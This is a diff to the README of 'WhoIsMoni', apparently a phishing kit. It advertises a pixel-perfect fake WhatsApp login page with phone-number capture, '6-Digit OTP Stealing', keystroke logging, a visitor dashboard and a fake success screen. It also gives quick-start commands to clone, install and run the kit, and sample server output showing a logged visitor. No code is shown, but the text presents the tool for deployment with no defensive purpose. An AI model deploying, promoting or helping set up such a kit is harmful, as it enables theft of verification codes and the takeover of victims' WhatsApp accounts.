@@ -10,18 +10,18 @@
 
 | Feature | Status |
 |---------|--------|
-| 🇺🇸 **International Phone Capture** (+1, +44, +91, +234, etc.) |
-| 🔑 **6-Digit OTP Stealing** (input + paste support) |
-| 📱 **Pixel-Perfect WhatsApp UI** (2026 design) |
-| 🌍 **20+ Country Selector** w/ Flags |
-| 👤 **Real-Time Typing Logging** |
-| 📊 **Live Visitor Dashboard** |
-| 📱 **Mobile-Responsive** |
-| 🎭 **Fake Success Screen** |
+| 🇺🇸 **International Phone Capture** (+1, +44, +91, +234, etc.) | ok |
+| 🔑 **6-Digit OTP Stealing** (input + paste support) | ok |
+| 📱 **Pixel-Perfect WhatsApp UI** (2026 design) | ok |
+| 🌍 **20+ Country Selector** w/ Flags | ok |
+| 👤 **Real-Time Typing Logging** | ok |
+| 📊 **Live Visitor Dashboard** | ok |
+| 📱 **Mobile-Responsive** | ok |
+| 🎭 **Fake Success Screen** | ok |
 
 # Quick Start
 
-### copy the git clone
+### git clone https://github.com/codingcreatively/WhoIsMoni.git
 ### cd WhoIsMoni
 ### pip install -r requirements.txt
 ### python3 whoismoni.py
@@ -31,7 +31,7 @@
 
 # Sample Console Output
 
-=== WhoIsMoni v1.0 ===
+=== WhoIsMoni ===
 Server running: http://0.0.0.0:8717
 
 [2026-02-28 12:51:39] 👤 NEW VISITOR: 127.0.0.1
